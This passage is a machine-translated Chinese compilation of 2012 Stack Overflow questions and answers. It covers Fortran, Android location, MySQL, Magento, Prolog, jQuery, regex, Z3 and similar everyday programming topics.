您最好按照 oracle 网站上的教程进行操作。它们非常好，您将非常快速地学习 java 的基础知识。

[http://docs.oracle.com/javase/tutorial/](http://docs.oracle.com/javase/tutorial/)

# arrays - fortran 90 更改数组类型/强制转换

> ID：13490865
> 
> 赞同：0
> 
> 时间：2012-11-21T10:10:50.473
> 
> 标签：arrays, casting, copy, fortran, fortran90

是否可以将 double 类型数组的类型（或复制）更改为 char？

我的目标是将准确的数据与字符串混合，然后写入 .txt 文件。

* * *

根据您的提示，我达到了以下代码：

```
Program logArray

Implicit None

Integer, Parameter :: wp = Selected_real_kind( 12, 70 )

Real( wp ), Dimension( 1:5 ) :: vals
Character( Len = 40 ), Dimension( 1:5 ) :: stuff

character (40) :: fileName
Integer :: i,stat

Call Random_number( vals )

write(*,*) 'Printing Values from Real array'
do i = 1, 5
    write(*,*) 'vals', i, vals(i)
end do

Write( stuff, '( "Value ", i1, " is ", f20.16 )' ) &
   ( i, vals( i ), i = 1, Size( vals ) )

fileName='log.txt'

open(2, file=fileName, status='replace', iostat=stat)
    if (stat /= 0) then
        write(*,*) fileName, ' The file  cannot be opened !'
        go to 20
    end if

    !Write( *, '( 99999( a, :, / ) )' ) stuff  
    Write( 2, '( 99999( a, :, / ) )' ) stuff 

    close(2)

    20 write(*,*) 'File Closed' 

End Program logArray 
```

但是，如果我想在 log.txt 上写类似的东西，我仍然不明白

“-----价值1的标题---------”

值 1 是 0.9975595900926172
值 2 是 0.5668247076112733

“-----值 3 表示爱-------”
值 3 是 0.9659153754961249
值 4 是 0.7479276854714322
值 5 是 0.3673908973747557

我是 Fortran 的新手。我曾经用循环写入文件，你的“魔法”指令以不同的方式做事，我不明白我怎么能在主要有利的情况下进行操作。

非常感谢您的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T11:53:55.563

不太清楚你的意思，但你可能需要一个内部文件——这就是你如何在 Fortran 中将数字数据转换为字符形式。这是一个例子：

```
[luser@cromer stackoverflow]$ cat char.f90
Program char

  Implicit None

  Integer, Parameter :: wp = Selected_real_kind( 12, 70 ) 

  Real( wp ), Dimension( 1:5 ) :: vals

  Character( Len = 40 ), Dimension( 1:5 ) :: stuff

  Integer :: i

  Call Random_number( vals )

  Write( stuff, '( "Value ", i1, " is ", f20.16 )' ) &
       ( i, vals( i ), i = 1, Size( vals ) )

  Write( *, '( 99999( a, :, / ) )' ) stuff

End Program char
[luser@cromer stackoverflow]$ nagfor -C=all -C=undefined char.f90
NAG Fortran Compiler Release 5.3.1 pre-release(904)
[NAG Fortran Compiler normal termination]
[luser@cromer stackoverflow]$ ./a.out
Value 1 is   0.5247509555250293         
Value 2 is   0.2338414404620047         
Value 3 is   0.8165253430643411         
Value 4 is   0.2788076219798084         
Value 5 is   0.9609032005446272 
```

线

```
 Write( stuff, '( "Value ", i1, " is ", f20.16 )' ) &
       ( i, vals( i ), i = 1, Size( vals ) ) 
```

是那个神奇的 - 它根据给定的格式写出 vals，但不是写入文件而是写入字符数组的东西，数组的每个元素都充当“文件”中的记录

我希望这是有道理的。为了更具体，我们需要更多细节。

# android - 未启用定位服务时检索 GPS 坐标

> ID：13490866
> 
> 赞同：0
> 
> 时间：2012-11-21T10:10:57.097
> 
> 标签：android

假设位置下设备的“使用无线网络”和“使用 GPS 卫星”设置未启用，是否仍然可以检索位置坐标。

目前，最好的是将用户重定向到未启用的设置页面。我发现这具有破坏性，因为需要离开应用程序。

如果我没记错的话，您可以以编程方式启用设置（我正确吗？）。

我不需要确切的坐标，是否可以在不启用设置的情况下获取手机信号塔 ID？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:18:39.347

不，如果用户不想给你他的位置，你就没有办法得到他的位置。

这是一种安全措施，它的存在是有充分理由的。如果您试图破坏这一点，您的应用将被视为恶意应用。

将用户重定向到设置页面是最好的选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:18:09.577

在不先询问用户的情况下以编程方式设置任何内容都是不好的做法。

您可以做的是，如果您无法获得位置，请让用户打开 GPS 或告诉他您的应用程序将无法工作并将关闭。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:23:49.747

未经用户同意以编程方式打开位置设置是不可能的，更不用说不好的做法了。您可以提示用户并指示他打开位置设置，或者如果您的程序跟踪设备用户的进度，您可以让程序发送某种警报，告诉他们位置设置已关闭。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:23:55.933

同意 - 在早期版本的 android 中，您可以以编程方式打开 GPS - 但较新的版本不允许这种情况发生。正如 Anup 所说 - 现在常见的可接受做法是将用户重定向到选项页面并允许用户选择允许应用程序使用的 GPS 的类型和性质。

别忘了，您不需要“离开应用程序”来让用户打开 GPS，您可以自己将它们发送到设置：

```
startActivityForResult(new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS), 0); 
```

然后，这将返回到您停止的应用程序 - 为用户提供无缝体验，并且他们将从其他 Android 应用程序熟悉的体验。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T13:21:53.123

[Deep Dive into Location](http://android-developers.blogspot.com/2011/06/deep-dive-into-location.html)有一套 Android LocationManager 的最佳实践。您不需要激活 GPS——在许多情况下，移动网络本身可以很好地估计位置，而不会占用额外的电池。

# mysql - 从邮政编码表（MySql）获取纬度和经度并加入另一个表

> ID：13490875
> 
> 赞同：0
> 
> 时间：2012-11-21T10:11:26.690
> 
> 标签：mysql, join, geocoding, postal-code

我有一个带有字段的慈善表：charity、postcode 和一个带有字段的邮政编码表：postcode、lat、lng

我想从网页发布邮政编码并找到最近的慈善机构

我是一个 mysql 初学者，所以我有点迷茫，但我一直在尝试使用连接和子查询的各种想法，但都不起作用（我要么遇到语法错误，要么'操作数应该包含 1 列'下面的代码）我有

```
Select charity,postcode,
 ( 
   (Select lat as lat2, lng as lng2
    from postcodes
    where postcode='WN8'
    )

3959 * acos( cos( radians(lat2) ) * cos( radians( lat ) ) * 
cos( radians( lng ) - radians(lng2) ) + 
sin( radians(lat2) ) * sin( radians( lat ) ) ) 
  )
AS distance 
FROM postcodes  
JOIN   Charities on charities.postcode=postcodes.postcode
HAVING distance < 30 ORDER BY distance LIMIT 0 , 30; 
```

我在这里看到了很多例子，其中 lat2 和 lng2 是从发布的值而不是从数据库中的表中获得的。

示例中的ps`'where postcode='WN8'`仅用于测试

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:29:34.003

不确定上述 SQL 遇到了什么错误。

但是尝试这个小调整，让我们知道你得到了什么错误

```
SELECT charity, postcode,
(3959 * acos( cos( radians(CustPostcode.lat) ) * cos( radians( postcodes.lat ) ) * 
cos( radians( postcodes.lng ) - radians(CustPostcode.lng) ) + 
sin( radians(CustPostcode.lat) ) * sin( radians( postcodes.lat ) ) ) 
  ) AS distance 
FROM postcodes  
INNER JOIN Charities ON charities.postcode=postcodes.postcode
CROSS JOIN  (SELECT lat, lng FROM postcodes WHERE postcode='WN8') CustPostcode
HAVING distance < 30 
ORDER BY distance 
LIMIT 0 , 30; 
```

如果您想知道最近的 30 个邮政编码以及与每个慈善机构的距离，那么这样的事情就可以完成（未经测试，请原谅任何拼写错误）。

```
SELECT charity, Charities.postcode, Postcodes.postcode, PostcodeDistance.distance
FROM Charities
CROSS JOIN Postcodes
INNER JOIN (SELECT PC1.postcode AS postcode1, PC2.postcode AS postcode2, (3959 * acos( cos( radians(PC1.lat) ) * cos( radians( PC2.lat ) ) * 
cos( radians( PC2.lng ) - radians(PC1.lng) ) + 
sin( radians(PC1.lat) ) * sin( radians( PC2.lat ) ) ) 
  ) AS distance 
FROM postcodes PC1
CROSS JOIN postcodes PC2) PostcodeDistance
ON Charities.postcode = PostcodeDistance.postcode1
AND Postcodes.postcode = PostcodeDistance.postcode2
HAVING distance < 30 
ORDER BY distance 
LIMIT 0 , 30; 
```

这应该会为您找到 30 英里范围内的慈善机构

```
SELECT charity, Charities.postcode, PostcodeDistance.distance
FROM Charities
INNER JOIN (
SELECT PC2.postcode AS postcode2, (3959 * acos( cos( radians(PC1.lat) ) * cos( radians( PC2.lat ) ) * 
cos( radians( PC2.lng ) - radians(PC1.lng) ) + 
sin( radians(PC1.lat) ) * sin( radians( PC2.lat ) ) ) 
) AS distance 
FROM postcodes PC1
CROSS JOIN postcodes PC2
WHERE PC1.postcode='WN8'  
) PostcodeDistance
ON Charities.postcode = PostcodeDistance.postcode2
WHERE PostcodeDistance.distance < 30 
ORDER BY PostcodeDistance.distance 
LIMIT 0 , 30; 
```

# magento - 如何在 Magento 中获取产品页面上的当前订单 ID？

> ID：13490899
> 
> 赞同：1
> 
> 时间：2012-11-21T10:12:12.047
> 
> 标签：magento

我在显示我在 Magento 商店中可用的产品的页面上。如果我继续将订单添加到我的购物车并在最后购买，我想获取订单的当前 ID。

由于每个说的订单不存在并且多个人可以同时购买，因此我必须以某种方式计算订单 ID，同时确保它不会与另一个同时下订单的人发生冲突。

另一件事就像我提到的那样，这是在产品列表页面（/../../../../../template/catalog/product/list.phtml）上，所以每个说的“订单”（我之前提到过）不存在。

如何以最佳方式获得未使用的订单 ID？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T10:51:17.920

在 Magento 中，在购物车上创建报价对象时，您添加的每个项目都有一个 quote_item 对象。

您可以从会话中获取当前报价 ID

```
$session        = Mage::getSingleton('checkout/session');
$quote_id       = $session->getQuoteId(); 
```

随后加载 sales_quote 对象

```
$item_quote     = Mage::getModel('sales/quote')->load($quote_id); 
```

通过这种方式，您可以轻松访问与报价表相关的任何属性。

对于购物车中的物品，您可以通过

```
$items_in_cart      = $quote->getAllItems(); 
```

并循环运行

```
foreach ($items_in_cart as $item) { 

  echo 'ID: '.$item->getProductId().'<br />';
  echo 'Name: '.$item->getName().'<br />';
  echo 'Sku: '.$item->getSku().'<br />';
  echo 'Quantity: '.$item->getQty().'<br />';
  echo 'Price: '.$item->getPrice().'<br />';

} 
```

希望这可以帮助！有关更多参考，您可以参考这里 [http://inchoo.net/ecommerce/magento/magento-quote-order-invoice-workflow/](http://inchoo.net/ecommerce/magento/magento-quote-order-invoice-workflow/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:32:29.737

看看[这里](http://inchoo.net/ecommerce/magento/programmatically-create-order-in-magento/)创建一个订单，您可以创建一个订单，当您保存新订单时，获取下一个订单 ID。

# prolog - 删除列表中的元音

> ID：13490900
> 
> 赞同：1
> 
> 时间：2012-11-21T10:12:13.357
> 
> 标签：prolog

编写一个删除元音 ( `String`, `NoVowelsString`) 的程序，删除给定字符串中的所有元音。

到目前为止，我已经有了条件`vowel(X):- member(X,[a,e,i,o,u])`。然后我想到了从另一个列表中删除所有元素的那个：

```
delete2([],L1,L1).
delete2([H|T],L1,L3) :-
   delete2(H,L1,R2),
   delete2(T,R2,L3). 
```

因此，有了这两个，我认为我可以对那些被删除的元素设置一个条件，即它们必须是`[a,e,i,o,u]`. 虽然我还没有得到任何地方。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-04-30T09:05:04.717

以下是基于[术语 equal/inequality](https://stackoverflow.com/questions/13664870/reification-of-term-equality-inequality)的具体化。

首先，我们首先定义`list_memberd_t/3`，它的行为就像 ，[`memberd_truth/3`](https://stackoverflow.com/a/27358600/4609915)但有不同的参数顺序：

```
list_memberd_t([]    ,_,false).
list_memberd_t([Y|Ys],X,Truth) :-
   if_(X=Y, Truth=true, list_memberd_t(Ys,X,Truth)).

list_memberd_truth(Xs,X,Truth) :- list_memberd_t(Xs,X,Truth). 
```

为简洁起见，让我们定义`memberd_t/3`基于`list_memberd_t/3`：

```
memberd_t(X,Xs,Truth) :- list_memberd_t(Xs,X,Truth). 
```

作为平行于`library(apply)`，让我们定义`tinclude/3`：

```
:- meta_predicate tinclude(2,?,?).
tinclude(P_2,Xs,Zs) :- 
    list_tinclude_list(Xs,P_2,Zs).

list_tinclude_list([],   _P_2,[]).
list_tinclude_list([E|Es],P_2,Fs0) :-
    if_(call(P_2,E), Fs0 = [E|Fs], Fs0 = Fs),
    list_tinclude_list(Es,P_2,Fs). 
```

`tfilter/3`是 的另一个名称`tinclude/3`：

```
tfilter(P_2,As,Bs) :-
   tinclude(P_2,As,Bs). 
```

接下来，我们定义元谓词`texclude/3`，它的反面[`tinclude/3`](https://stackoverflow.com/a/22053194/4609915)：

```
:- meta_predicate texclude(2,?,?).
texclude(P_2,Xs,Zs) :- 
    list_texclude_list(Xs,P_2,Zs).

list_texclude_list([],_,[]).
list_texclude_list([E|Es],P_2,Fs0) :-
    if_(call(P_2,E), Fs0 = Fs, Fs0 = [E|Fs]),
    list_texclude_list(Es,P_2,Fs). 
```

现在让我们一起使用它们！

```
?- texclude(list_memberd_truth([a,e,i,o,u]),
            [d,e,l,e,t,e,' ',v,o,w,e,l,s,' ',i,n,' ',a,' ',l,i,s,t], Filtered).
Filtered  = [d,  l,  t,  ' ',v,  w,  l,s,' ',  n,' ',  ' ',l,  s,t]. 
```

* * *

### 编辑

作为使用 above 的替代方法`texclude/3`，让我们使用`tinclude/3`辅助谓词`not/3`来翻转真值：

```
:- meta_predicate not(2,?,?).
not(P_2,X,Truth) :-
   call(P_2,X,Truth0),
   truth_flipped(Truth0,Truth).

truth_flipped(true,false).
truth_flipped(false,true). 
```

示例查询：

```
?- tinclude(not(list_memberd_truth([a,e,i,o,u])),
            [d,e,l,e,t,e,' ',v,o,w,e,l,s,' ',i,n,' ',a,' ',l,i,s,t], Filtered).
Filtered  = [d,  l,  t,  ' ',v,  w,  l,s,' ',  n,' ',  ' ',l,  s,t]. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T10:10:23.750

这里是使用 DCG 的解决方案。注意“输出”是如何获得的（没有参数传递，只有差异列表）

```
novowels --> ("a";"e";"i";"o";"u"), !, novowels.
% or ..
% novowels --> [C], {memberchk(C, "aeiou")}, !, novowels.
novowels, [C] --> [C], !, novowels.
novowels --> []. 
```

我必须承认第二次剪辑不喜欢我，但似乎是必需的。

测试：

```
?- phrase(novowels, "abcdefghilmnopq", L),format('~s',[L]).
bcdfghlmnpq
L = [98, 99, 100, 102, 103, 104, 108, 109, 110|...]. 
```

**编辑**关于第二次切割，“左手”表示法似乎需要：如果我用参数编码，没有切割，我得到一个正确的解析：

```
novowels(Cs) --> ("a";"e";"i";"o";"u"), !, novowels(Cs).
% novowels(Cs) --> [C], {memberchk(C, "aeiou")}, !, novowels(Cs).
novowels([C|Cs]) --> [C], novowels(Cs).
novowels([]) --> []. 
```

测试：

```
?- phrase(novowels(L), "abcdefghilmnopq"),format('~s',[L]).
bcdfghlmnpq
L = [98, 99, 100, 102, 103, 104, 108, 109, 110|...] ;
false. 
```

我想知道这是否是 DCG 翻译器的错误，或者（更可能）是我的错......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T23:51:11.990

这是代码

```
deleteV([H|T],R):-member(H,[a,e,i,o,u]),deleteV(T,R),!.
deleteV([H|T],[H|R]):-deleteV(T,R),!.
deleteV([],[]). 
```

它能做什么？首先它质疑自己？它是元音元音是->我们忽略它。不->我们需要它。如果它找到一个空列表，它会构造结果列表，并且当从回溯返回时，它会在前面附加辅音。此代码在 SWIProlog 中进行了测试。

# firefox - 禁用“阻止此页面创建其他对话框”

> ID：13490902
> 
> 赞同：2
> 
> 时间：2012-11-21T10:12:18.160
> 
> 标签：firefox, google-chrome, browser

当我连续显示一些警报时，会出现“防止此页面创建其他对话框”复选框。我知道这是一个浏览器功能，但我想禁用它。什么解决方案！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:19:10.227

由于这是一个内置的浏览器功能，您无法更改它，Chrome 也没有此选项。其他浏览器可能有此选项，但这不太可能，因为这可以防止警报垃圾邮件。您可能还会发现浏览器或较旧的浏览器版本可能禁用或根本没有此功能，但我不建议使用较旧的浏览器。此外，如果您不频繁显示警报，则不会出现该复选框。

最好的替代方案可能是使用 javascript/HTML 解决方案来提示用户，`<div>`它高于所有其他，有点像*LightBox*所做的。

# opengl-es - webgl 和 opengl es 有什么区别？

> ID：13490915
> 
> 赞同：2
> 
> 时间：2012-11-21T10:13:17.250
> 
> 标签：opengl-es, webgl

我在互联网上搜索时发现了用于 3d 游戏浏览器的 webgl 和 opengl es。但是我不明白这两种api有什么区别。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:41:22.280

WebGL is based on OpenGL-ES, but with the difference that it is written with a HTML5 Canvas being the container for a GL context. Also it defines a new set of JavaScript functions available through a GL context enabled Canvas DOM.

OpenGL-ES is a specification for a plattform independent rendering API. The browser and HTML5 canvas *is* a plattform, and WebGL is a derivation of OpenGL-ES-2 for this plattform.

# c++ - 为不受支持的平台调整 Boost 线程/进程

> ID：13490918
> 
> 赞同：1
> 
> 时间：2012-11-21T10:13:20.780
> 
> 标签：c++, boost, real-time, boost-thread, boost-interprocess

**背景**

[该](http://www.netbsd.org/~jmmv/process/boost_process/platforms_and_compilers.html) 文档说可以**使库适应新的（不受支持的）操作系统**。因为我想支持的操作系统（实时操作系统）**接近 Win32**，所以我希望很少有代码更改。我没有使用 Boost Thread 和 Boost Interprocess 的经验。

**问题**

*   如果不支持平台，你会推荐使用 Boost 的 Thread 和 Boost 的 Interprocess 吗？
*   有什么好处和坏处？
*   您会考虑哪些替代方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-15T12:27:59.083

这一切都取决于您的需求。使用可移植库具有明显的优势。稳定一个新平台可能需要一些时间。

我建议您为每个不适用于特定平台的功能创建票证，并与 Boost 作者密切合作。

# regex - Java正则表达式在matlab中获取值

> ID：13490920
> 
> 赞同：0
> 
> 时间：2012-11-21T10:13:24.600
> 
> 标签：regex, matlab

嗨，我想知道如何在 matlab 中执行此操作：我有一个文件，在文件的某处我有这个字符串 = **"1 to 10 of 434M"**。我想得到**"434M"**。尽管记住 M 也可以是其他字母（K 或 B），但始终是大写字母。字母前的密码最多可以是 3 个削片机，但也可以更小。

我如何从matlab中的文本中得到这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:36:35.297

假设您逐行读取文件。然后为每一行执行以下命令：

```
% line is current line of input file
[matchstart,~,~,~,tokenstring] = regexp(line, '1 to 10 of (\d+[MKB])');
if ~isempty(matchstart)
  desired_string = tokenstring{1};
end 
```

此正则表达式至少匹配之前的一位数字`M`。（例如 451274M）如果它应该只匹配 1 到 3 位数的数字，请使用：

```
'1 to 10 of (\d{1,3}[MKB])' 
```

# algorithm - SQL查询的校验和算法？

> ID：13490921
> 
> 赞同：1
> 
> 时间：2012-11-21T10:13:27.933
> 
> 标签：algorithm, md5, sha, crc32

我需要根据 SQL 查询和该查询中使用的任何参数的字符串值生成校验和。校验和用于缓存场景。如果校验和存在于缓存中，那么结果也存在，然后我不需要点击数据库。

Req 1：重要的是两个不同的查询不会生成相同的哈希。因为这可能会导致返回意外结果。

需求 2：它不能非常慢，但它又在内存中，不应该有太多的内容。

鉴于上下文，哪种算法最适合？CRC32、MD5、SHA1 还是其他？

//丹尼尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:48:41.273

将与参数连接的整个查询字符串放在常规的 HashTable / Dictionary / HashMap 或您的语言中调用的任何内容中。将 SQL 查询作为键，将结果作为值。

您的 HashTable 将为您的字符串使用适当的散列函数并解决任何散列冲突。

# jquery - 通过 ajax 完全加载内容后，如何在完全加载后运行更多脚本？

> ID：13490928
> 
> 赞同：1
> 
> 时间：2012-11-21T10:13:39.217
> 
> 标签：jquery, ajax

我正在通过 ajax 加载内容，但我试图`specSlide();`在我的附加数据完全加载或完成后触发...

有谁知道我该怎么做？

谢谢

```
$.ajax({

    type: 'GET',
    url: '<?php bloginfo('template_url'); ?>/bike-profile.php',
    data:
        {
            varbike : bikes
        },
    dataType: 'html',
    success: function(data){

        $(currentSlideHtmlObject).append(data);

        specSlide();

    }

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:34:54.503

您可以在此处使用[ajaxSuccess](http://docs.jquery.com/Ajax/ajaxSuccess)更多：[http](http://www.slideshare.net/wildan.m/jquery-talk-to-server-with-ajax) ://www.slideshare.net/wildan.m/jquery-talk-to-server-with-ajax （幻灯片 47 之后）

# javascript - 选中复选框的背景颜色

> ID：13490929
> 
> 赞同：1
> 
> 时间：2012-11-21T10:13:41.557
> 
> 标签：javascript, jquery, html, css

> **可能重复：**
> [使用 jquery 更改 li 的背景颜色](https://stackoverflow.com/questions/5918167/change-background-color-of-li-using-jquery)

我正在尝试在 onselect 'checkbox' 上更改 li 的背景颜色。

```
<ul>
 <li><input type="checkbox" /> Link 1</li>
 <li><input type="checkbox" /> Link 2</li>
 <li><input type="checkbox" /> Link 3</li>
 <li><input type="checkbox" /> Link 4</li>
</ul> 
```

当有人选择复选框时，我需要更改整行背景颜色。

![在此处输入图像描述](../Images/c0d58e52c85cdbef4fc4f0c63a418082.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:18:47.967

**HTML**

```
<ul>
 <li><input type="checkbox" /> <label> Link 1</label></li>
 <li><input type="checkbox" /> <label> Link 2</label></li>
 <li><input type="checkbox" /> <label> Link 3</label></li>
 <li><input type="checkbox" /> <label> Link 4</label></li>
</ul>​ 
```

**CSS**

```
label{width:150px; display:inline-block}
input[type="checkbox"]:checked+label{background:blue; color:white}​ 
```

**[演示](http://jsfiddle.net/qgGne/1/)**

对于 IE，您可以使用类似**[http://selectivizr.com/的库](http://selectivizr.com/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:16:46.200

试试这个，我认为它会工作。

```
$('input[type=checkbox]').click(function(){
$('input[type=checkbox]').parent().css('background',''); //This turns all checkboxes background to default
$(this).parent().css('background','red');
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:18:15.020

试试这个：

```
$('input[type=checkbox]').click(function(){
    if(this.checked) {
        $(this).parent().css('background','red');
    } else {
        $(this).parent().css('background','');
    }
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:22:34.607

试试这个：

[http://jsfiddle.net/AHrrP/](http://jsfiddle.net/AHrrP/)

HTML

```
<ul>
 <li><input type="checkbox" /> Link 1</li>
 <li><input type="checkbox" /> Link 2</li>
 <li><input type="checkbox" /> Link 3</li>
 <li><input type="checkbox" /> Link 4</li>
</ul>​ 
```

JS

```
$(function(){
    $('input[type="checkbox"]').click(function(){
        if(this.checked)
            $(this).closest('li').addClass('blue');
        else
            $(this).closest('li').removeClass('blue');
    });
});​ 
```

CSS

```
li {
    padding:4px;
}

li.blue {
    background-color: #08C;
}​ 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T10:18:17.080

jQuery

```
$('input[type=checkbox]').click(function(){
    $(this).parent().toggleClass('highlight');
}); 
```

CSS

```
.highlight{
    background-color:blue;
} 
```

我假设您希望重新单击复选框时突出显示消失。这是一个工作的[jsbin](http://jsbin.com/odezah/1/edit)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-21T10:21:28.453

```
$('li :checkbox').click(function(){
    $(this).parent().css('background',$(this):is(":checked")?'blue':'');
}); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-21T10:22:15.437

试试这个：

```
 <ul id="myList">
        <li><input type="checkbox" /> Link 1</li>
        <li><input type="checkbox" /> Link 2</li>
        <li><input type="checkbox" /> Link 3</li>
        <li><input type="checkbox" /> Link 4</li>
    </ul>

    <script type="text/javascript">
        $(document).ready(function(){
            $('#myList input').each(function(){
            console.log(this);
                $(this).click(function(){
                console.log(this);
                    if($(this).prop('checked')){
                        $(this).parent().css('background','#eee');
                    }
                    else{
                        $(this).parent().css('background','');
                    }
                });
            });             
        });

    </script> 
```

# iphone - 无法在 Webdav 服务器上上传图像。iPhone SDK

> ID：13490930
> 
> 赞同：0
> 
> 时间：2012-11-21T10:13:41.023
> 
> 标签：iphone, file-upload, webdav

我刚刚从[这里](http://code.google.com/p/wtclient/)下载了 WTClient 。它用于通过 iOS 连接 WebDav 服务器。

我在这里做的是上传一个 .png 文件。所以，我下载了它的示例应用程序并用我的凭据更新了它，但一切都是徒劳的。我在实现这一目标方面面临很多困难。而且我不知道会出什么问题？

代码如下：

**上传 Btn 操作**

```
- (IBAction)uploadFile:(id)sender 
{
    transferType = TransferTypeUpload;
    [self prepareTransferClient];
} 
```

**准备客户**

```
- (void)prepareTransferClient {

self.transferClient = [[[WTClient alloc] initWithLocalURL:[NSURL fileURLWithPath:[[NSBundle mainBundle] pathForResource:@"test" ofType:@"png"]]
                            remoteURL:[NSURL URLWithString:@"http://www.mywebsite.com/test"]
                             username:@"user"
                             password:@"pass"] autorelease];

[self.transferClient setDelegate:self];
[self performSelectorInBackground:@selector(startTransfer) withObject:nil];
} 
```

StartTransfer 是 WTClient 的内置函数，用于开始上传数据。请帮忙！

PS我尝试通过App [WebDav Navigator](https://itunes.apple.com/in/app/webdav-navigator/id382551345?mt=8)检查服务器是否更正，我可以上传图像。

基本上，我想要的只是在 WebDav 服务器上上传图像，我对此很陌生，所以我找到了这个框架。您是否知道我可以与 WebDav 服务器交互的任何其他替代方案？

欢迎任何形式的建议，答案。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:52:21.257

是的，我明白了……

[从 GitHub](https://github.com/jkichline/ACConnect/tree/master/src/ACWebDAV)下载

并在`Classes`其中`Request`包含用于上传、下载、移动、复制、删除文件的所有类。

这是您问题的完美解决方案。我已经成功地使用它`ACWebDavClasses`在 webdav 服务器上上传、下载、复制、移动文件....

让我知道这是否对你有帮助......:)

# charts - Jqplot 饼图不利用 div 容器的全宽和全高

> ID：13490931
> 
> 赞同：2
> 
> 时间：2012-11-21T10:13:43.113
> 
> 标签：charts, width, jqplot

刚刚注意到显示的饼图没有利用容器的全部宽度和高度。

我可以看到一些空格。下面附上图片。

![在此处输入图像描述](../Images/13f91bf212ce9303c8e46f83fb47a395.png)

我已经为 div 绘制了边框。很明显，饼图没有利用完整的宽度和高度。

我该如何解决这个问题？

任何帮助，将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T00:22:09.293

看起来默认的饼图渲染器有 20px 的填充。通过调整填充来减少它，例如：

```
jQuery("#'. $id .'").jqplot([your data here],
       {
          seriesDefaults: {
            renderer: jQuery.jqplot.PieRenderer,
            rendererOptions: {
              padding: 10
            }
       }
}); 
```

# regex - 匹配不在行尾的空格

> ID：13490933
> 
> 赞同：1
> 
> 时间：2012-11-21T10:13:55.640
> 
> 标签：regex

我正在尝试匹配所有空格并转换为转义空格，但只有那些没有出现在行尾的空格，到目前为止，我已经尝试过`/\ !$/\\\ /g`在该点周围进行一般按钮混搭。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:18:46.197

使用这个正则表达式`(?m)( +)(?!$)`

`(?m)`正则表达式选项multyLine

`( +)`> 0 个空格

`(?!$)`不是行尾

# z3 - 访问具有多个字段的排序元素

> ID：13490937
> 
> 赞同：2
> 
> 时间：2012-11-21T10:14:10.660
> 
> 标签：z3, smt

我在使用 SMTlib2 格式的排序时遇到了一些问题。例如，我将 Interval 定义为：

```
(declare-sort Pair 2)
(define-sort Interval () (Pair Int Int)) 
```

现在如何从函数返回一个新的间隔？例如：

```
(define-fun getInterval ((a Int) (b Int)) Interval
  (Interval a b)) 
```

这行不通。我的问题是：如何构造和实例化给定类型的对象，以及如何访问它们的字段？

现在我正在使用我创建的 2 个 UF 作为字段获取器，但我仍然不知道如何拥有一个构造函数：

```
(declare-fun L (Interval) Int)
(declare-fun H (Interval) Int) 
```

谢谢，努诺

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:36:43.867

您应该查看[Z3 SMT 指南中的记录小节、数据类型部分](http://rise4fun.com/z3/tutorialcontent/guide#h27)。`mk-pair`基本上，您可以使用构造函数和两个选择器创建记录类型`first`并`second`访问其字段。

这是一个示例^([rise4fun链接](http://rise4fun.com/Z3/KQ1))：

```
(set-option :macro-finder true)

(declare-datatypes (T1 T2) ((Pair (mk-pair (first T1) (second T2)))))

(define-sort Interval () (Pair Int Int))
(define-fun getInterval ((a Int) (b Int)) Interval
  (mk-pair a b))

(declare-const p1 Interval)
(declare-const p2 Interval)

;construct objects of a give sort
(assert (= p1 (getInterval 2 2)))

;accessing their fields
(assert (= (first p1) (second p2)))

(check-sat)
(get-model) 
```

# php - sql查询条件检查

> ID：13490938
> 
> 赞同：5
> 
> 时间：2012-11-21T10:14:12.377
> 
> 标签：php, mysql

我有桌子

*   销售订单

在此表中具有列名

*   订单号
*   订单状态
*   订单类型

SQL查询：

```
SELECT order_no FROM sales_orders where order_status='Pending' and order_type='1' 
```

在上面的查询中，如果`order_type=1`数据库列中不存在该值，这意味着值 1 而不是值 '0' ，我想显示一个错误。

如何为此修改上述查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:20:36.563

如果我理解正确，如果 order_type 不等于 1，您希望显示错误。如果是这样，您可以执行以下操作：

```
$query = "SELECT order_no FROM sales_orders where order_status='Pending' and order_type = 1";

if ($result = $mysqli->query($query)) {
    while ($row = $result->fetch_object()) {
        if ($row->order_type != 1) {
            printf('There is no rail order for order number %d', $row->order_no);
        }
    }

    $result->close();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:21:22.143

然后 SQL 应该是这样的（你不能在 WHERE 中使用 order_type=1 ，因为你也希望返回“错误”结果，因此你需要在那里使用 IF ）：

```
SELECT IF(order_type=1,'OK','Error') AS okErrorFlag ,order_no
FROM sales_orders 
